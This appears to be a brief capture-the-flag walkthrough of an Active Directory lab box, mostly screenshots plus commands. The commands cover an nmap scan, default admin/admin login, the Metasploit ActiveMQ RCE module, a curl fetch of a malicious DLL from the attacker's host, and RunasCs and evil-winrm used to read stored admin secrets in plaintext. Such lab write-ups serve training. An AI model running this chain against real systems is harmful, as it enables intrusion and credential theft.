![image](https://github.com/stensil4rt/CodeBy/assets/62753044/9978a913-08ab-40d8-a1c8-338fa6805d66)

```
nmap -p- 192.168.2.8 -v -sC -sV -Pn
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/84fb52b4-7c16-4c90-adad-6d26a3fd40d8)

admin/admin

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/f885f3e9-c4e7-4b48-9bb3-d56c39be9796)

msf6

multi/misc/apache_activemq_rce_cve_2023_46604

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/ab3f585e-50c7-4c02-8d33-abd7a511b7b3)

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/12c6196c-cf44-4ba4-93fd-f9e5cc911e85)

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/d7db10fb-550f-4160-8bd9-e3791687ce40)

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/5ea4d1ce-b2b9-4b54-b667-f65774c1500f)

https://www.exploit-db.com/exploits/51267

```
curl -O http://192.168.100.IP:8000/TextShaping.dll
```

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/2186c168-638f-43da-9d82-f159611a0753)

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/0dcc902b-1063-4e27-bc3d-b9f067f7be60)

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/5e7d7ba3-ddf7-4b65-b9b5-c0ebf5f984c9)

https://github.com/antonioCoco/RunasCs

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/288e71b3-ab6a-471e-9856-28201fb91477)
```
evil-winrm -i 192.168.2.8 -u LOGIN -p PASS -s ~/CodeBy/AD/Hhran
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/9c6718d9-e431-40ba-87fc-0835d4cf35cc)
```
Invoke-RunasCs LOGIN PASS "powershell -c Get-SecretInfo" -d CODEBY
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/a8f4f008-9925-4b39-8ce8-9fc872d01413)
```
Invoke-RunasCs LOGIN PASS "powershell -c Get-Secret -Name AdmLogin -AsPlainText" -d CODEBY
```
```
Invoke-RunasCs LOGIN PASS "powershell -c Get-Secret -Name AdmPassword -AsPlainText" -d CODEBY
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/ed7e7156-f73c-4831-b05c-fedfba56de0e)
```
evil-winrm -i 192.168.2.8 -u Administrator -p PASS
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/eb8dd166-5bda-42a5-aba6-f9030a231220)

